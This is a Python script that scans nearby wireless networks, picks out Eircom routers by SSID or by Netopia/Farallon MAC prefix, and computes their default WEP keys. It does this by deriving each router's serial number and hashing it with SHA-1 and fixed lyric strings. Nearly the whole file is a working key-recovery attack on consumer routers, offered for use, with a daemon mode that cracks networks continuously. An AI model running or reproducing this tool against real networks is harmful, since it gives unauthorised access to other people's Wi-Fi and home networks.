#!/usr/bin/python

import optparse
import os
import re
import sha
import subprocess
import sys
import time

"""Eircom default WEP key autogenerator for Mac OS X and Linux iwtools.

I have subdivided this code too much.

Heavily based on http://h1.ripway.com/kevindevine/wep_key.html
All credit for the key generation goes to Kevin Devine

"""

__author__ = "nosmo@netsoc.tcd.ie (nosmo)"

intwords = ["Zero","One","Two","Three","Four","Five","Six","Seven","Eight","Nine"]
inttoword = lambda a: intwords[int(a)]
hendrix = ["Although your world wonders me, ",
           "with your superior cackling hen,",
           "Your people I do not understand,",
           "So to you I shall put an end and"]

SLEEPINTERVAL = 5
NETOPIAPREFIX = "00:0f:cc"
FARALLONPREFIX = "00:00:c5"

def GetAPs(numkeys,ssid=None):
    """Parse eircom???? ???? SSIDs.

    Args:
     ssid: an optional supplied ssid for getting the key from the command line

    Returns:
      results: a list of two entry lists containing the octal for the access points
    """

    results = []
    
    if sys.platform == "darwin":
        scanproc = subprocess.Popen(("/System/Library/PrivateFrameworks/Apple80211."
                                     "framework/Versions/Current/Resources/airport "
                                     "-s") , shell = True, stdout = subprocess.PIPE)
        output = scanproc.communicate()[0].split("\n")
        output.pop(0)

        if len(output) == 0:
            sys.stderr.write(("No access points detected - This may be because there "
                              "are no APs or because the airport tool returned too quickly!\n"))
            while len(output) == 0:
                scanproc = subprocess.Popen(("/System/Library/PrivateFrameworks/Apple80211."
                                             "framework/Versions/Current/Resources/airport "
                                             "-s") , shell = True, stdout = subprocess.PIPE)
                output = scanproc.communicate()[0].split("\n")
        output.pop(len(output) - 1)

        print "Detected the following access points"
        for line in output:
            line = line.lstrip()
            print "|\t%s" % line
            line = line.split(" ")

            if line[0].startswith("eircom"):
                line[0] = line[0].strip("eircom")
                if re.compile("\d{4}").match(line[1]):
                    results.append([line[0], line[1]])
                else:
                    # Some people seem to be in the odd habit of joining the numbers
                    results.append([line[0]])
            #else: 
            #    manufacheck = CheckManufacturer(line[1])
            #    if manufacheck:
            #        print SerialfromMAC(line[1], manufacheck)
            #Testing:
            else:
                manufacheck = CheckManufacturer(line[2])
                if manufacheck:
                    print "!:"
                    macserial = SerialfromMAC(line[2], manufacheck)
                    DoKeys(macserial, [line[0], line[1]], numkeys)
                    continue

    elif sys.platform == "linux2":

        scanproc = subprocess.Popen(("/sbin/iwlist %s scanning" % optparse.options.interface),
                                    shell = True, stdout = subprocess.PIPE)
        output = scanproc.communicate()[0].split("\n")
    
        for line in output:
            if line.find("ESSID:") != -1:
                ssid = line.split("\"")[1]
                ssid = ssid.split(" ")
                if ssid[0].startswith("eircom"):
                    ssid[0] = ssid[0].strip("eircom")
                    results.append(ssid)

    elif sys.platform == "ssidonly":

        single = []

        for i in ssid.split(" "):
            if i.startswith("eircom"):
                    i = i.strip("eircom")
            single.append(i)
        results.append(single)

    return results
    
def CheckManufacturer(macaddress):
    if macaddress.startswith(NETOPIAPREFIX):
        print "Netopia router detected. Generating tentative keys"
        return 1
    elif macaddress.startswith(FARALLONPREFIX):
        print "Netopia/Farallon router detected. Generating tentative keys"
        return 2
    return 0
    
def ParseOct(instr):
    """Parse the octal numbers from the AP SSIDs

    Args:
      instr: a 4 digit string to be converted to an int representation of the
      octal

    Returns:
      octal: a true integer containing the base-10 representation of the octal
    """
    
    octal = 0
    for digit in instr:
        octal  = (octal << 3) + int(digit)
    return octal
    
def SerialfromMAC(macaddress, company):
    #We don't need no stinking 2.6 transpose(None,":")
    # -8: in order to get the last 8 characters (the last 6 digits)
    macaddress = filter(lambda a: a!=":", macaddress[-8:])
    serial = 0
    for i in macaddress:
        serial = serial << 4
        serial += int(i, 16)
    if company == 1:
        serial += 0x01000000
    return serial

def SerialNumber(ssidoct):
    """Get the serial number form the supplied octal.

    Args:
      ssidoct: the base-10 int obtained from the octal

    Returns:
      serialnumber: the serial number of the access point
    """

    if len(ssidoct) != 2:
        return None

    # XOR the second segment with 0x0FCC (The Netopia MAC prefix)
    mac_segment = ssidoct[1] ^ 0x0FCC

    # Shift the first segment over by 12
    shiftseg = ssidoct[0] << 12

    # 0x01000000 because all Netopia serials start with it
    serial_start = 0x01000000

    fseg = (ssidoct[0] & 0xffffffff) >> (32 - 12)
    
    serialnumber = ((shiftseg | fseg) | mac_segment) + serial_start
    print serialnumber
    return serialnumber

def SerialString(serial):
    """Return the 'OneTwoThree' string of the serial number

    Args:
      serial: the serial number of the access point

    Returns:
      serialstr: the string of the serial number of the AP
    """
    
    serialno = str(serial)
    serialstr = ""
    for number in serialno:
        serialstr += inttoword(number)
    return serialstr

def DoAll(numkeys):
    """Do everything, really.
    
     Call all of the relevant functions in order to get the serial key, then
    do the SHA-related hackery to get the actual key(s?).
    
    Args:
      numkeys: the number of keys to generate - 1 or 4.
      
    Returns:
      owt.
    """

    access_points = GetAPs(numkeys, optparse.options.ssidonly)

    octalbits = []

    for ap in access_points:

        octconv = []
        for chunk in ap:
            octconv.append(ParseOct(chunk))

        octalbits.append(octconv)
        serial = SerialNumber(octconv)
        
        keymass = ""
        
        DoKeys(serial, ap, numkeys)

def DoKeys(serial, ap, numkeys):

    if not(serial):
        return
    else:

        serialstr = SerialString(serial)
        shahex = "" 

        length = 1
        if numkeys == 4:
            length = len(hendrix)
        for i in range(length):
            shastr = sha.new(serialstr + hendrix[i])
            shahex += shastr.hexdigest()
            
        ind = 0
        
        print "eircom%s %s:" % (ap[0], ap[1])            
        while (ind < numkeys*26):
            print "\t\t%s" % shahex[ind:ind+26]
            ind += 26

def main():
    parser = optparse.OptionParser(usage=("Usage: Eircog.py [-s|--ssidonly "
                                          "eircomstring] [-d] [-4] [-i INTERFACE]"))

    parser.add_option("-s", "--ssidonly", action="store", type="string",
                     dest="ssidonly", help=("Specifies a manual SSID, no scanning "
                                            "is done (Don't forget double quotes for"
                                            " spaces!"))
    parser.add_option("-i", "--interface", action="store", type="string",
                     dest="interface", help="The interface to scan with.")
                                            
    parser.add_option("-d", "--daemon", action="store_true", default=False,
                      dest="daemon", help="Run constantly.")
    parser.add_option("-4", action="store_true", default=False, dest="allkeys", 
                      help="Generate all four keys instead of just one.")

    (optparse.options, optparse.args) = parser.parse_args()

    daemon = False
    if optparse.options.ssidonly:
        sys.platform = "ssidonly"
    elif optparse.options.daemon:
        daemon = True
        
    numkeys = 1
    
    if optparse.options.allkeys:
        numkeys = 4
    if sys.platform == "linux" and not(optparse.options.interface):
        sys.stderr.write("Interface not specified!\n")
        sys.exit(1)

    if daemon:
        os.system("/usr/bin/clear")
        while True:
            os.system("/usr/bin/clear")
            DoAll(numkeys)
            time.sleep(SLEEPINTERVAL)
            
    else:
        DoAll(numkeys)


if __name__ == "__main__":
    main()
